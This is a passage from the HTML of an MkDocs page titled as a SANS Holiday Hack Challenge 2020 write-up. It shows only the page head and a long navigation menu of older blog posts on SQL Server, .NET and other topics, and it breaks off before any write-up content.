<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        
        
        <link rel="shortcut icon" href="../../../img/favicon.ico">
        <title>SANS Holiday Hack Challenge 2020 (KringleCon 3) Write-up - My Docs</title>
        <link href="../../../css/bootstrap.min.css" rel="stylesheet">
        <link href="../../../css/font-awesome.min.css" rel="stylesheet">
        <link href="../../../css/base.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css">

        <script src="../../../js/jquery-1.10.2.min.js" defer></script>
        <script src="../../../js/bootstrap.min.js" defer></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
        <script>hljs.initHighlightingOnLoad();</script> 
    </head>

    <body>
        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
            <div class="container">
                <a class="navbar-brand" href="../../..">My Docs</a>
                <!-- Expander button -->
                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
                    <span class="navbar-toggler-icon"></span>
                </button>

                <!-- Expanded navigation -->
                <div id="navbar-collapse" class="navbar-collapse collapse">
                        <!-- Main navigation -->
                        <ul class="nav navbar-nav">
                            <li class="navitem">
                                <a href="../../.." class="nav-link">Welcome to MkDocs</a>
                            </li>
                            <li class="navitem">
                                <a href="../../../about/" class="nav-link">Valens mori urbem ignibus virtus qui mediis</a>
                            </li>
                            <li class="navitem">
                                <a href="../../../index%20copy/" class="nav-link">Welcome to MkDocs</a>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2006 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">09</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2006 09 26 simple way to speed up the query</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2006/09/2006-09-26-simple-way-to-speed-up-the-query/" class="dropdown-item">Simple way to speed up the query</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">10</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2006 10 01 good blog</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2006/10/2006-10-01-good-blog/" class="dropdown-item">Good blog</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2006 10 17 searching object across the databases</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2006/10/2006-10-17-searching-object-across-the-databases/" class="dropdown-item">searching object across the databases.</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">11</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2006 11 27 knowing how much time your query is taking</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2006/11/2006-11-27-knowing-how-much-time-your-query-is-taking/" class="dropdown-item">Knowing how much time your query is taking!!</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2006 11 27 sql server table variables to eliminate the need for cursors</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2006/11/2006-11-27-sql-server-table-variables-to-eliminate-the-need-for-cursors/" class="dropdown-item">SQL Server Table Variables To Eliminate The Need For Cursors</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2006 11 29 searching with different criteria in sql server 2000</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2006/11/2006-11-29-searching-with-different-criteria-in-sql-server-2000/" class="dropdown-item">Searching with different criteria in SQL server 2000</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">12</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2006 12 16 can not drop user from database</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2006/12/2006-12-16-can-not-drop-user-from-database/" class="dropdown-item">can not drop user from database</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2007 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">03</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2007 03 05 checking for the existence of a temporary table</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2007/03/2007-03-05-checking-for-the-existence-of-a-temporary-table/" class="dropdown-item">Checking for the existence of a temporary table</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2007 03 05 returning value from sp executesql</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2007/03/2007-03-05-returning-value-from-sp_executesql/" class="dropdown-item">Returning value from sp_executesql</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2008 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">05</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2008 05 26 convert string to byte array and viceversa</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2008/05/2008-05-26-convert-string-to-byte-array-and-viceversa/" class="dropdown-item">Convert  string to byte array and viceversa</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2008 05 26 process start open the file from the application after writing on the file</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2008/05/2008-05-26-process-start-open-the-file-from-the-application-after-writing-on-the-file/" class="dropdown-item">Process.Start() - Open the file from the application after writing on the file</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2008 05 26 removing comments using xpathnavigator selectdescendantssystem xml xpath xpathnodetype commentfalse</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2008/05/2008-05-26-removing-comments-using-xpathnavigator-selectdescendantssystem-xml-xpath-xpathnodetype-commentfalse/" class="dropdown-item">Removing comments using XPathNavigator.SelectDescendants(System.Xml.XPath.XPathNodeType.Comment,false);</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">06</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2008 06 02 visual studio 2005 build error the volume for a file has been externally altered so that the opened file is no longer valid</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2008/06/2008-06-02-visual-studio-2005-build-error-the-volume-for-a-file-has-been-externally-altered-so-that-the-opened-file-is-no-longer-valid/" class="dropdown-item">Visual studio 2005 Build error :- The volume for a file has been externally altered so that the opened file is no longer valid</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">07</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2008 07 23 gios pdf net library</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2008/07/2008-07-23-gios-pdf-net-library/" class="dropdown-item">Gios PDF .NET library</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2008 07 23 use sections in the config file and access them</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2008/07/2008-07-23-use-sections-in-the-config-file-and-access-them/" class="dropdown-item">Use sections in the config file and access them...</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">08</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2008 08 08 nice add ins for reflector</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2008/08/2008-08-08-nice-add-ins-for-reflector/" class="dropdown-item">Nice add-ins for Reflector</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">11</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2008 11 28 gazal by jagjit singh hai lau zindagi</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2008/11/2008-11-28-gazal-by-jagjit-singh-hai-lau-zindagi/" class="dropdown-item">Gazal by Jagjit Singh - Hai Lau Zindagi</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2009 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">01</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2009 01 26 asp net performace tricks</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2009/01/2009-01-26-asp-net-performace-tricks/" class="dropdown-item">ASP.NET performace tricks</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2009 01 28 quickly open a file in vs2005vs2008</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2009/01/2009-01-28-quickly-open-a-file-in-vs2005vs2008/" class="dropdown-item">Quickly open a file in VS2005/VS2008</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">06</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2009 06 06 roadmap to learn rest representational state transfer</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2009/06/2009-06-06-roadmap-to-learn-rest-representational-state-transfer/" class="dropdown-item">Roadmap to learn REST (Representational State Transfer)</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2009 06 30 the soap vs rest</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2009/06/2009-06-30-the-soap-vs-rest/" class="dropdown-item">The SOAP vs REST</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">08</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2009 08 15 accessing user controls control from the aspx page‏</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2009/08/2009-08-15-accessing-user-controls-control-from-the-aspx-page%E2%80%8F/" class="dropdown-item">Accessing user control's control from the ASPX page‏</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">09</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2009 09 06 programmatically showing only the custom styles in the style pane of a word 2007 file</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2009/09/2009-09-06-programmatically-showing-only-the-custom-styles-in-the-style-pane-of-a-word-2007-file/" class="dropdown-item">Programmatically showing only the custom styles in the style pane of a Word 2007 file</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2009 09 19 procrastination</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2009/09/2009-09-19-procrastination/" class="dropdown-item">Procrastination</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2009 09 20 sql server –error the for xml clause is not allowed in a insert statement returning the result of a for xml elements in a dynamic query to a variable</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2009/09/2009-09-20-sql-server-%E2%80%93error-the-for-xml-clause-is-not-allowed-in-a-insert-statement-returning-the-result-of-a-for-xml-elements-in-a-dynamic-query-to-a-variable/" class="dropdown-item">SQL Server –Error - The FOR XML clause is not allowed in a INSERT statement. - Returning the result of a FOR XML, ELEMENTS in a dynamic query to a variable</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">10</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2009 10 02 difference between rpc and document centricmessage oriented application</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2009/10/2009-10-02-difference-between-rpc-and-document-centricmessage-oriented-application/" class="dropdown-item">Difference between RPC and Document-Centric/Message Oriented application</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">11</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2009 11 22 software engineer and the social service</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2009/11/2009-11-22-software-engineer-and-the-social-service/" class="dropdown-item">Software engineer and the social service</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2010 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">03</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 03 20 tablediff exe in sql server 2005</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/03/2010-03-20-tablediff-exe-in-sql-server-2005/" class="dropdown-item">TableDiff.exe in Sql Server 2005</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">06</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 06 13 faultexception exception thrown by the service is not caught by the client catchfaultexception</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/06/2010-06-13-faultexception-exception-thrown-by-the-service-is-not-caught-by-the-client-catchfaultexception/" class="dropdown-item">FaultException() exception thrown by the service is not caught by the client catch(FaultException)</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">08</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 08 22 entity framework 4 0 lazy loading eager loading and explicit loading</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/08/2010-08-22-entity-framework-4-0-lazy-loading-eager-loading-and-explicit-loading/" class="dropdown-item">Entity Framework 4.0 : Lazy loading, Eager loading and Explicit loading</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 08 25 entity framework 4 poco support 1 via objectcontext</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/08/2010-08-25-entity-framework-4-poco-support-1-via-objectcontext/" class="dropdown-item">Entity Framework 4 : POCO support 1 (via ObjectContext)</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 08 25 how awesome is system threading tasks parallel class</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/08/2010-08-25-how-awesome-is-system-threading-tasks-parallel-class/" class="dropdown-item">How awesome is System.Threading.Tasks.Parallel class?</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">09</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 09 04 entity framework using select stored procedures for entities having same column names</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/09/2010-09-04-entity-framework-using-select-stored-procedures-for-entities-having-same-column-names/" class="dropdown-item">Entity Framework - Using Select stored procedures for entities having same column names</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 09 07 entity framework ctp4 – code first – map your poco entities to different table</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/09/2010-09-07-entity-framework-ctp4-%E2%80%93-code-first-%E2%80%93-map-your-poco-entities-to-different-table/" class="dropdown-item">Entity Framework CTP4 – Code First – Map your POCO entities to different table</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 09 07 entity framework – ctp4 code first does not support stored procedures yet</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/09/2010-09-07-entity-framework-%E2%80%93-ctp4-code-first-does-not-support-stored-procedures-yet/" class="dropdown-item">Entity Framework – CTP4 - Code-first does not support stored procedures YET.</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 09 10 sql server coding guidelines and best practices</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/09/2010-09-10-sql-server-coding-guidelines-and-best-practices/" class="dropdown-item">Sql Server - Coding Guidelines and best practices</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 09 10 table variables do get created in the tempdb</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/09/2010-09-10-table-variables-do-get-created-in-the-tempdb/" class="dropdown-item">Table variables do get created in the TempDB</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 09 19 debuggerdisplay attribute</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/09/2010-09-19-debuggerdisplay-attribute/" class="dropdown-item">[DebuggerDisplay] Attribute</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 09 23 bulk insert using openxml</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/09/2010-09-23-bulk-insert-using-openxml/" class="dropdown-item">Bulk insert using OpenXML</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">10</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 10 17 using unity application block 2 0 the given assembly name or codebase was invalid exception from hresult 0x80131047</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/10/2010-10-17-using-unity-application-block-2-0-the-given-assembly-name-or-codebase-was-invalid-exception-from-hresult-0x80131047/" class="dropdown-item">Using Unity Application Block 2.0 - The given assembly name or codebase was invalid. (Exception from HRESULT: 0x80131047)</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">11</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 11 01 sql server 2008 generate the data script insert script from tables</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/11/2010-11-01-sql-server-2008-generate-the-data-script-insert-script-from-tables/" class="dropdown-item">SQL Server - Generate the data script (insert script)  for existing data in tables</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2010 11 26 new apis in system io</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2010/11/2010-11-26-new-apis-in-system-io/" class="dropdown-item">New APIs in System.IO</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2011 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">01</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2011 01 11 customizing ribbon in office 2007 using open office xml and vba</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2011/01/2011-01-11-customizing-ribbon-in-office-2007-using-open-office-xml-and-vba/" class="dropdown-item">Customizing Ribbon in Office 2007 using Open Office XML and VBA</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2011 01 12 adding custom pane to the ribbon in microsoft word 2007 using openxml sdk 2 0 and vba</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2011/01/2011-01-12-adding-custom-pane-to-the-ribbon-in-microsoft-word-2007-using-openxml-sdk-2-0-and-vba/" class="dropdown-item">Adding custom pane to the ribbon in Microsoft Word 2007 using OpenXML SDK 2.0 and VBA</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">08</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2011 08 01 a beautiful poem</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2011/08/2011-08-01-a-beautiful-poem/" class="dropdown-item">A beautiful poem</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">11</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2011 11 19 entity framework code first disable pluralization of your tables</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2011/11/2011-11-19-entity-framework-code-first-disable-pluralization-of-your-tables/" class="dropdown-item">Entity framework - Code first - Disable pluralization of your tables</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2012 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">02</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2012 02 03 error install package conflict occurred jquery 1 5 1 referenced but requested jquery 1 6 4 jquery vsdoc 1 5 1 jquery validation 1 8 0 jquery ui combined 1 8 11 depend on jquery 1</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2012/02/2012-02-03-error-install-package-conflict-occurred-jquery-1-5-1-referenced-but-requested-jquery-1-6-4-jquery-vsdoc-1-5-1-jquery-validation-1-8-0-jquery-ui-combined-1-8-11-depend-on-jquery-1/" class="dropdown-item">Error Install-Package : Conflict occurred. 'jQuery 1.5.1' referenced but requested 'jQuery 1.6.4'. 'jQuery.vsdoc 1.5.1, jQuery.Validation 1.8. 0, jQuery.UI.Combined 1.8.11' depend on 'jQuery 1.5.1'</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">04</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2012 04 11 productivity notes</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2012/04/2012-04-11-productivity-notes/" class="dropdown-item">Productivity notes</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">05</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2012 05 03 a simple way to generate random password</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2012/05/2012-05-03-a-simple-way-to-generate-random-password/" class="dropdown-item">A simple way to generate random password</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">08</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2012 08 29 understanding and detecting deadlocks in sql server</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2012/08/2012-08-29-understanding-and-detecting-deadlocks-in-sql-server/" class="dropdown-item">Understanding and detecting deadlocks in Sql Server</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">09</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2012 09 07 using tracepoints in visual studio</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2012/09/2012-09-07-using-tracepoints-in-visual-studio/" class="dropdown-item">Using Tracepoints in Visual Studio</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2012 09 09 inversion of control ioc</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2012/09/2012-09-09-inversion-of-control-ioc/" class="dropdown-item">Inversion of Control (IoC)</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2012 09 10 dependency injection</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2012/09/2012-09-10-dependency-injection/" class="dropdown-item">Dependency Injection</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2012 09 17 generate random password</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2012/09/2012-09-17-generate-random-password/" class="dropdown-item">Generate random password</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">10</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2012 10 16 unit testing a static method which calls another static method</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2012/10/2012-10-16-unit-testing-a-static-method-which-calls-another-static-method/" class="dropdown-item">Unit testing a static method which calls another static method using Moq</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">12</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2012 12 31 2012 in review</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2012/12/2012-12-31-2012-in-review/" class="dropdown-item">2012 in review</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2013 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">04</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2013 04 01 connecting to mysql database and fetching records using jdbc connection in tibco businessworks</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2013/04/2013-04-01-connecting-to-mysql-database-and-fetching-records-using-jdbc-connection-in-tibco-businessworks/" class="dropdown-item">Connecting to MySql database and fetching records using JDBC connection in TIBCO BusinessWorks</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">05</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2013 05 01 from yessql to nosql with raven db</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2013/05/2013-05-01-from-yessql-to-nosql-with-raven-db/" class="dropdown-item">From &ldquo;Yes&rdquo;SQL to NoSQL with Raven Db</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">09</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2013 09 16 sqldbtype structured another gem in ado net</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2013/09/2013-09-16-sqldbtype-structured-another-gem-in-ado-net/" class="dropdown-item">SqlDbType.Structured [another gem in ADO.NET] and Bulk insert using Table Valued Parameters</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">10</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2013 10 23 sql serverchange data capture cdc for watching database tables for dml operations</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2013/10/2013-10-23-sql-serverchange-data-capture-cdc-for-watching-database-tables-for-dml-operations/" class="dropdown-item">SQL Server&ndash;Change Data Capture [CDC] for &ldquo;Watching&rdquo; database tables for DML operations</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">12</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2013 12 31 2013 in review</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2013/12/2013-12-31-2013-in-review/" class="dropdown-item">2013 in review</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2014 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">01</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2014 01 23 maximum connection exceeded how to know who are logged on to a server and not letting you in</a>
    <ul class="dropdown-menu">
            
<li>
